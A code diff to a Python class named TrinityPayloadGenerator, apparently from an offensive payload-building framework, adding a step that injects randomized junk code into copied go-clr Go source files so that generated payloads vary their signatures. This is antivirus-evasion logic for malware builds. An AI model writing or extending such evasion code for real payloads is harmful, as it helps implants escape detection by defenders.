@@ -1061,6 +1061,27 @@ class TrinityPayloadGenerator:
                 # Copy the entire go-clr directory to the temp directory
                 shutil.copytree(local_go_clr_path, temp_go_clr_path, dirs_exist_ok=True)
 
+                # Add randomized junk code to go-clr files to vary signatures
+                # Create a new polymorphic engine instance for junk code generation
+                junk_poly_engine = PolymorphicEngine()
+
+                # Walk through all .go files in the go-clr directory
+                for root, dirs, files in os.walk(temp_go_clr_path):
+                    for file in files:
+                        if file.endswith('.go'):
+                            file_path = os.path.join(root, file)
+
+                            # Read the original file
+                            with open(file_path, 'r', encoding='utf-8') as f:
+                                original_content = f.read()
+
+                            # Inject junk code using the polymorphic engine
+                            junk_content = junk_poly_engine.inject_junk_code_into_go_file(original_content)
+
+                            # Write the modified content back
+                            with open(file_path, 'w', encoding='utf-8') as f:
+                                f.write(junk_content)
+
                 # Add replace directive to use local go-clr module
                 result = subprocess.run([
                     'go', 'mod', 'edit', '-replace', 'agents/go-clr=./agents/go-clr'
